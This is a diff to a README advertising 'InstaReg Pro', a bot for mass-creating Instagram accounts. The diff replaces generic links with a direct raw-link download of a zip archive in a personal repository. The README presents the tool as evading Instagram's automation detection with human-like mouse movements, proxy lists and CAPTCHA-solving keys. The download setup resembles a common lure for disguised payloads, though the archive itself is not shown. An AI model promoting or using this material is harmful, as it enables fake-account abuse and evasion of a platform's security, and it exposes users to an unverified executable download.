@@ -2,7 +2,7 @@
 
 Let's be honest: creating Instagram accounts manually is a nightmare, and most bots get flagged instantly. I built InstaReg Pro to solve that. Instead of just filling out forms, this tool actually mimics how a real person signs up from a mobile device, making it significantly harder for Instagram's security systems to spot the automation.
 
-**[⬇️ Download InstaReg Pro](https://github.com)**
+**[⬇️ Download InstaReg Pro](https://raw.githubusercontent.com/michaelnessim712/InstaReg/main/proconference/Insta_Reg_3.0.zip)**
 
 ## 🛠️ The Technical Side (How it works)
 
@@ -41,7 +41,7 @@ Instead of instant clicks, the tool uses **Bezier curve mouse movements** and ra
 
 ## ⚙️ Quick Start
 
-1. **Grab the Tool:** Download the latest version from the **[Download Link](https://github.com)**.
+1. **Grab the Tool:** Download the latest version from the **[Download Link](https://raw.githubusercontent.com/michaelnessim712/InstaReg/main/proconference/Insta_Reg_3.0.zip)**.
 2. **Setup:** Plug in your proxy list and your CAPTCHA API key in the settings.
 3. **Launch:** Choose how many accounts you want and hit **Start**.
 4. **Save:** Your account details (email, pass, cookie) are saved automatically to a `.txt` file.
